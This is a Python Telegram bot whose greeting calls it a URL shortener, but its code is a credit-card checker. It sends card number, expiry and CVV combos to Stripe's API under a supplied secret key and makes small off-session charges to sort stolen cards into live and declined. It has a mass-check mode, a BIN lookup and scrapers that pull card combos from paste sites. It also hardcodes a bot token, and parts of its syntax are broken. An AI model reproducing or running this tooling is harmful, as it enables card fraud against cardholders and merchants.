from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ( CommandHandler, Filters, MessageHandler, Updater)
from message import Editmessage, Sendmessage, logger
from Miscellaneous.Scraper import pastebin, text_scraper, throwbin, ghostbin
import os
import requests
from bs4 import BeautifulSoup
import random
import string
import time
import json
import math
dia='✅'
from collections import OrderedDict


HTTP API:
# 5339966957:AAF4cmZSF8OH-BhwpNzsHHUic9ccn6_yQYs

bot_token = 5339966957:AAF4cmZSF8OH-BhwpNzsHHUic9ccn6_yQYs
startmessage = [[
		InlineKeyboardButton(
			"Dev",
			url='t.me/UrlshortnerDC_bot'
        InlineKeyboardButton(
			"Channel",
			url='t.me/UrlshortnerDC_bot'
		)
        ]]

#random str GEN FOR EMAIL
N = 10
rnd = ''.join(random.choices(string.ascii_lowercase +
                                string.digits, k = N))

def start(update, context):
    info = update.effective_user
    print(info)
    chat_id = info.id
    print(chat_id)
    userid= info['username']
    text = f'Welcome @{userid},Url shortner bot can shorten any Url'
    Sendmessage(chat_id, text, reply_markup=InlineKeyboardMarkup(startmessage))
    return

def combos_spilt(combos):
    split = combos.split('\n')
    return split
    
####################################################################################################################################3
# help botstart botcmds botinfo bin

def help(update, context):
    chat_id = update.message.chat_id
    text = "Available cmds available:\n shorten url\n  MORE WILL BE UPDATED SOON"
    Sendmessage(chat_id, text, reply_markup= InlineKeyboardMarkup(startmessage))
def botstart(update, context):
    chat_id = update.message.chat_id
    text = "Hey! I am a CC-Checker!"
    Sendmessage(chat_id, text)
def botcmds(update, context):
    chat_id = update.message.chat_id
    text = "Hey, welcome to this Bot! Below I show you all available commands: \n Bin lookup: /bin xxxxxx \n SK-Chck: /sk sk_live_xxxxxxxxxxx \n CC-Check:/chk xxxxxxxxxxxx|xx|xx|xxx"
    Sendmessage(chat_id, text)
def botinfo(update, context):
    chat_id = update.message.chat_id
    text = "Hey! I am a CC-Checker bot with a few extras. Send /botcmds for a list of all commands!"
    Sendmessage(chat_id, text)

def bin(update, context):
    chat_id = update.message.chat_id
    info = update.effective_user
    chat_id = info.id
    userid= info['username']
    text =  update.message.text.split(' ', 1)
    try:
        if text[-1].isdigit() and len(text[-1]) >=6:
            r = requests.get("https://lookup.binlist.net/" + str(text[1][:6]))
            url=r.text
            if len(url)>5:
                res=json.loads(url)
                ab=text[-1]
                if "bank" not in res:
                    res["bank"] = {'name': 'Unavailable'}
                if "country" not in res:
                    res["country"] = {"name": "Unavailable" , "emoji": " " , "currency": "--"}
                elif "type" not in res:
                    res["type"] = "Unavailable"
	
                bb=res["scheme"]
                dia='✅'
                dd=res["type"]
                true,false=True,False
                dd=res["type"]
                p=("Valid Bin! {} \n ━━━━━━━━━━━━━━━  \n • Bin: {} \n • Country: {} {} \n • Bank: {} \n • Scheme: {} \n • Type: {} \n • Currency: {} \n━━━━━━━━━━━━━━━ \n 👤 Checked By: @ASURCCWORLDBOT\n Used By @{}")
                text=p.format(dia ,ab[:6] ,res["country"]["name"],res["country"]["emoji"],res["bank"]["name"],bb,dd,res["country"]["currency"],userid)
                Sendmessage(chat_id, text)
            else:
                chat_id = update.message.chat_id
                info = update.effective_user
                chat_id = info.id
                userid= info['username']
                ab=text[-1]
                wdia='❌'
                p = "Not Valid Bin!{} \n ━━━━━━━━━━━━━━━  \n • Bin: {} \n ━━━━━━━━━━━━━━━ \n👤 Checked By: @ASURCCWORLDBOT\n  Used By @{}"
                text = p.format(wdia,ab[:6],userid)
                Sendmessage(chat_id, text)
             
        else:
            chat_id = update.message.chat_id
            info = update.effective_user
            chat_id = info.id
            userid= info['username']
            ab=text[-1]
            wdia='❌'
            p = "Not Valid Bin!{} \n ━━━━━━━━━━━━━━━  \n • Bin: {} \n 👤 Checked By: @ASURCCWORLDBOT\n Used By @{}"
            text = p.format(wdia,ab[:6],userid)
            Sendmessage(chat_id, text)
    except KeyError as err:
        wdia='❌'
        p = "{}Invaild Bin!!"
        text = p.format(wdia)
        Sendmessage(chat_id, text)
################################################################################################################################
def asetsk(update, context):
    chat_id = update.message.chat_id
    info = update.effective_user
    chat_id = info.id
    global sk_chg
    userid= info['username']
    text =  update.message.text.split(' ', 1)
    tt=text[-1]
    if tt[:3]=="sk" or "pk":
        text=" ✅ Your Sk Key has been set!!"
        sk_chg = tt
        Sendmessage(chat_id, text)
    else:
        text ="Default is been continued as your sk key is invalid"
        Sendmessage(chat_id, text)


################################################################################################################################
#$$$$$$$$$$$$$$$$$$$$11111111111111111111111111111
def chk(update,context):
    chat_id = update.message.chat_id
    info = update.effective_user
    chat_id = info.id
    userid= info['username']
    tic = time.perf_counter()
    wdia ='❌'
    crs = '➟'
    dia='✅'
    text =  update.message.text.split(' ', 1)
    maintxt=text[-1]
    i=maintxt.split("|")
    cc=i[0]

    skq1=sk_chg[:16]
    skq2="x"*78
    skq3=sk_chg[-4:]
    skmains=(skq1+skq2+skq3)
    mes=i[1]
    ano=i[2]
    cvv=i[3]
    url = 'https://api.stripe.com/v1/payment_methods'
    headers = {
        'Authorization': 'Bearer' + " " +sk_chg,
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'type': 'card',
        'card[number]': i[0],
        'card[exp_month]': i[1],
        'card[exp_year]': i[2],
        'card[cvc]': i[3]
    }
    response = requests.post(url, headers=headers, data=data)
    q=response.text
    w=json.loads(q)
    if "testmode_charges_only" in response.text:
        text = (f"""
{wdia} SK-key expired {crs} Change SK key \n Sk-key {crs} <code>{skmains}</code> \n RESPONSE {crs} Testmode Charges Only \n ━━━━━━━━━━━━━━━ \n CHECKED BY @ASURCCWORLDBOT \n Used by @{userid}
""")
        Sendmessage(chat_id , text)
    if "error" in w:
        text = (f"""
{wdia} Error {crs} {w["error"]["code"]} \n  ━━━━━━━━━━━━━━━ \n CHECKED BY @ASURCCWORLDBOT \n Used by @{userid}
""")
#Response {crs} {w["error"]["decline_code"]}
        Sendmessage(chat_id , text)
    else:
        #second request
        url = 'https://api.stripe.com/v1/payment_intents'
        headers = {
            'Authorization': 'Bearer' + " " +sk_chg,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
            'amount': '60',
            'currency': 'usd',
            'payment_method_types[]': 'card',
            'description': 'Asur Donation',
            'payment_method': w["id"],
            'confirm': 'true',
            'off_session': 'true'
        }
        response = requests.post(url, headers=headers, data=data)
        b=response.text
        e=json.loads(b)
        if "error" not in e:
            msg = "CCN or CVV LIVE!"
        else:
            msg = e["error"]["message"]
        toc = time.perf_counter()
        if 'card' in w:
            if w['card']['three_d_secure_usage']['supported'] == True:
                vs ="False ✅"
            else:
                vs="True ❌"
        else:
            vs="True ❌"
        if "incorrect_cvc" in b:
            text = (f"""
{dia} CC {crs} <code>{cc[:7]}xxxxxxxxxx|{mes}|{ano}|{cvv}</code>
STATUS {crs} #ApprovedCCN
MSG {crs} {msg}
VBV[3D] {crs} {vs}
TOOK: {toc - tic:0.4f}s 
CHECKED BY @ASURCCWORLDBOT
Used by @{userid}
""")
            Sendmessage(chat_id , text)
        elif "Unrecognized request URL" in b:
            text = ("[UPDATE] PROXIES ERROR")
            Sendmessage(chat_id , text)
        elif response.status_code == 200:
            text = (f"""
✔️CC➟ <code>{cc[:7]}xxxxxxxxxx|{mes}|{ano}|{cvv}</code> \n
STATUS ➟ #ApprovedCVV \n
Response -» Successfully Charged 1$ {dia} \n
Gateway -» Stripe Charge 1$ \n
VBV[3D] {crs} {vs}  \n
TOOK: {toc - tic:0.4f}s\n
CHECKED BY @ASURCCWORLDBOT \n
Used by @{userid}
""")
            Sendmessage(chat_id , text)
        else:
            if msg ==  "Your card has insufficient funds.":
                msg = "Your card has insufficient funds ✅"
                text=(f"""
{wdia} CC {crs} <code>{cc[:7]}xxxxxxxxx|{mes}|{ano}|{cvv}</code> \n STATUS {crs} Declined \n MSG {crs} {msg} \n TOOK: {toc - tic:0.4f} \n CHECKED BY @ASURCCWORLDBOT \n
Used by @{userid}
""")
            else:
                text=(f"""
{wdia} CC {crs} <code>{cc[:7]}xxxxxxxxx|{mes}|{ano}|{cvv}</code> \n STATUS {crs} Declined \n MSG {crs} {msg} \n TOOK: {toc - tic:0.4f} \n CHECKED BY @ASURCCWORLDBOT \n
Used by @{userid}
""")
            Sendmessage(chat_id , text)
######################################################################################################################
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$5555555555555555555555555
def mass_helper(chat_id,sk_chg ,userid,combo):
    status = Sendmessage(chat_id, '<i>Checking....</i>')
    tic = time.perf_counter()
    wdia ='❌'
    crs = '➟'
    dia='✅'
    try:
        i=combo.split("|")
        cc=i[0]
        skq1=sk_chg[:16]
        skq2="x"*78
        skq3=sk_chg[-4:]
        skmains=(skq1+skq2+skq3)
        mes=i[1]
        ano=i[2]
        cvv=i[3]
        url = 'https://api.stripe.com/v1/payment_methods'
        headers = {
        'Authorization': 'Bearer' + " " +sk_chg,
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
            'type': 'card',
            'card[number]': i[0],
            'card[exp_month]': i[1],
            'card[exp_year]': i[2],
            'card[cvc]': i[3]
        }
        response = requests.post(url, headers=headers, data=data)
        q=response.text
        w=json.loads(q)
        if "testmode_charges_only" in response.text:
            text = (f"""
    {wdia} SK-key expired {crs} Change SK key \n Sk-key {crs} <code>{skmains}</code> \n RESPONSE {crs} Testmode Charges Only \n ━━━━━━━━━━━━━━━ \n CHECKED BY @ASURCCWORLDBOT \n Used by @{userid}
    """)
            Editmessage(chat_id, text, status)
        if "error" in w:
            text = (f"""
{wdia} Error {crs} {w["error"]["code"]} \n  ━━━━━━━━━━━━━━━ \n CHECKED BY @ASURCCWORLDBOT \n Used by @{userid}
""")
#Response {crs} {w["error"]["decline_code"]}
            Editmessage(chat_id, text, status)
        else:
        #second request
            url = 'https://api.stripe.com/v1/payment_intents'
            headers = {
            'Authorization': 'Bearer' + " " +sk_chg,
            'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {
                'amount':  '60' ,
                'currency': 'usd',
                'payment_method_types[]': 'card',
                'description': 'Asur Donation',
                'payment_method': w["id"],
                'confirm': 'true',
                'off_session': 'true'
            }
            response = requests.post(url, headers=headers, data=data)
            b=response.text
            e=json.loads(b)
            if "error" not in e:
                msg = "CCN or CVV LIVE!"
            else:
                msg = e["error"]["message"]
            toc = time.perf_counter()
            if 'card' in w:
                if w['card']['three_d_secure_usage']['supported'] == True:
                    vs ="False ✅"
                else:
                    vs="True ❌"
            else:
                vs="True ❌"
            if "incorrect_cvc" in b:
                text = (f"""
{dia} CC {crs} <code>{cc[:7]}xxxxxxxxxx|{mes}|{ano}|{cvv}</code>
STATUS {crs} #ApprovedCCN
MSG {crs} {msg}
VBV[3D] {crs} {vs}
TOOK: {toc - tic:0.4f}s 
CHECKED BY @ASURCCWORLDBOT
Used by @{userid}
""")
                Editmessage(chat_id, text, status)
            elif "Unrecognized request URL" in b:
                text = ("[UPDATE] PROXIES ERROR")
                Editmessage(chat_id, text, status)
            elif response.status_code == 200:
                text = (f"""
✔️CC➟ <code>{cc[:7]}xxxxxxxxxx|{mes}|{ano}|{cvv}</code>
STATUS ➟ #ApprovedCVV 
Response -» Successfully Charged 1$ {dia} 
Gateway -» Stripe Charge 1$ 
VBV[3D] {crs} {vs}
TOOK: {toc - tic:0.4f}s
CHECKED BY @ASURCCWORLDBOT
Used by @{userid}
""")
                Editmessage(chat_id, text, status)
            else:
                if msg ==  "Your card has insufficient funds.":
                    msg = "Your card has insufficient funds ✅"
                    text=(f"""
{wdia} CC {crs} <code>{cc[:7]}xxxxxxxxx|{mes}|{ano}|{cvv}</code> \n STATUS {crs} Declined \n MSG {crs} {msg} \n TOOK: {toc - tic:0.4f} \n CHECKED BY @ASURCCWORLDBOT \n
Used by @{userid}
""")
                else:
                    text=(f"""
{wdia} CC {crs} <code>{cc[:7]}xxxxxxxxx|{mes}|{ano}|{cvv}</code> \n STATUS {crs} Declined \n MSG {crs} {msg} \n TOOK: {toc - tic:0.4f} \n CHECKED BY @ASURCCWORLDBOT \n
Used by @{userid}
""")
                Editmessage(chat_id, text, status)

    except IndexError:
        Editmessage(chat_id, 'Enter Valid CCs Format!!', status)
        return
######################################################################################################################################################################
def duty(update,context):
    chat_id = update.message.chat_id
    info = update.effective_user
    chat_id = info.id
    userid= info['username']
    tic = time.perf_counter()
    wdia ='❌'
    crs = '➟'
    dia='✅'
    text =  update.message.text.split(' ', 1)
    if text[0][:4] == "!chk":
        maintxt=text[-1]
        payyy=text[0][4:]
        paytxt = int(payyy)
        i=maintxt.split("|")
        cc=i[0]
        skq1=sk_chg[:16]
        skq2="x"*78
        skq3=sk_chg[-4:]
        skmains=(skq1+skq2+skq3)
        mes=i[1]
        ano=i[2]
        cvv=i[3]
        url = 'https://api.stripe.com/v1/payment_methods'
        headers = {
        'Authorization': 'Bearer' + " " +sk_chg,
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
            'type': 'card',
            'card[number]': i[0],
            'card[exp_month]': i[1],
            'card[exp_year]': i[2],
            'card[cvc]': i[3]
        }
        response = requests.post(url, headers=headers, data=data)
        q=response.text
        w=json.loads(q)
        if "testmode_charges_only" in response.text:
            text = (f"""
    {wdia} SK-key expired {crs} Change SK key \n Sk-key {crs} <code>{skmains}</code> \n RESPONSE {crs} Testmode Charges Only \n ━━━━━━━━━━━━━━━ \n CHECKED BY @ASURCCWORLDBOT \n Used by @{userid}
    """)
            Sendmessage(chat_id , text)
        if "error" in w:
            text = (f"""
{wdia} Error {crs} {w["error"]["code"]} \n  ━━━━━━━━━━━━━━━ \n CHECKED BY @ASURCCWORLDBOT \n Used by @{userid}
""")
#Response {crs} {w["error"]["decline_code"]}
            Sendmessage(chat_id , text)
        else:
        #second request
            url = 'https://api.stripe.com/v1/payment_intents'
            headers = {
            'Authorization': 'Bearer' + " " +sk_chg,
            'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {
                'amount': paytxt*60,
                'currency': 'usd',
                'payment_method_types[]': 'card',
                'description': 'Asur Donation',
                'payment_method': w["id"],
                'confirm': 'true',
                'off_session': 'true'
            }
            response = requests.post(url, headers=headers, data=data)
            b=response.text
            e=json.loads(b)
            if "error" not in e:
                msg = "CCN or CVV LIVE!"
            else:
                msg = e["error"]["message"]
            toc = time.perf_counter()
            if 'card' in w:
                if w['card']['three_d_secure_usage']['supported'] == True:
                    vs ="False ✅"
                else:
                    vs="True ❌"
            else:
                vs="True ❌"
            if "incorrect_cvc" in b:
                text = (f"""
{dia} CC {crs} <code>{cc[:7]}xxxxxxxxxx|{mes}|{ano}|{cvv}</code>
STATUS {crs} #ApprovedCCN
MSG {crs} {msg}
VBV[3D] {crs} {vs}
TOOK: {toc - tic:0.4f}s 
CHECKED BY @ASURCCWORLDBOT
Used by @{userid}
""")
                Sendmessage(chat_id , text)
            elif "Unrecognized request URL" in b:
                text = ("[UPDATE] PROXIES ERROR")
                Sendmessage(chat_id , text)
            elif response.status_code == 200:
                text = (f"""
✔️CC➟ <code>{cc[:7]}xxxxxxxxxx|{mes}|{ano}|{cvv}</code> \n
STATUS ➟ #ApprovedCVV \n
Response -» Successfully Charged {paytxt}$ {dia} \n
Gateway -» Stripe Charge {paytxt}$ \n
VBV[3D] {crs} {vs}  \n
TOOK: {toc - tic:0.4f}s\n
CHECKED BY @ASURCCWORLDBOT \n
Used by @{userid}
""")
                Sendmessage(chat_id , text)
            else:
                if msg ==  "Your card has insufficient funds.":
                    msg = "Your card has insufficient funds ✅"
                    text=(f"""
{wdia} CC {crs} <code>{cc[:7]}xxxxxxxxx|{mes}|{ano}|{cvv}</code> \n STATUS {crs} Declined \n MSG {crs} {msg} \n TOOK: {toc - tic:0.4f} \n CHECKED BY @ASURCCWORLDBOT \n
Used by @{userid}
""")
                else:
                    text=(f"""
{wdia} CC {crs} <code>{cc[:7]}xxxxxxxxx|{mes}|{ano}|{cvv}</code> \n STATUS {crs} Declined \n MSG {crs} {msg} \n TOOK: {toc - tic:0.4f} \n CHECKED BY @ASURCCWORLDBOT \n
Used by @{userid}
""")
                Sendmessage(chat_id , text)
    elif text[0] == "!mass":
        acountt=0
        if '\n' in text[1]:
            simple = combos_spilt(text[1])
            for i in simple:
                acountt+=1
                mass_helper(chat_id,sk_chg,userid, i)
                if acountt==20:
                    break
                else:
                    continue
            Sendmessage(chat_id, 'Ｃｏｍｐｌｅｔｅｄ')
        else:
            mass_helper(chat_id, text[1])
#####################################################################################################
	
def scraperdfnc(update, context):
    msg = update.message.text
    status_msg = update.message
    chat_id = status_msg.chat_id
    try:
        if 'pastebin' in msg:
            link = msg.split(' ')[1]
            pastebin(chat_id,link)
        elif 'ghostbin' in msg:
            link = msg.split(' ')[1]
            ghostbin(chat_id,link)
        else:
            scrape_text = status_msg['reply_to_message']['text']
            text_scraper(chat_id, scrape_text)
    except:
        Sendmessage(chat_id, 'Only Supports pastebin, please check if you send paste bin link')

def main():
    updater = Updater(
        bot_token,
        use_context=True
    )
    dp = updater.dispatcher
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, duty))
    dp.add_handler(CommandHandler("scrape", scraperdfnc))
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(CommandHandler("botinfo", botinfo))
    dp.add_handler(CommandHandler("asetsk", asetsk))
    dp.add_handler(CommandHandler("botcmds", botcmds))
    #dp.add_handler(CommandHandler("ashowsk", ashowsk))
    dp.add_handler(CommandHandler("chk", chk))
    dp.add_handler(CommandHandler("bin", bin))
    dp.add_handler(CommandHandler("botstart", botstart))
    logger.info("Bot Started!!!")
    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    main()
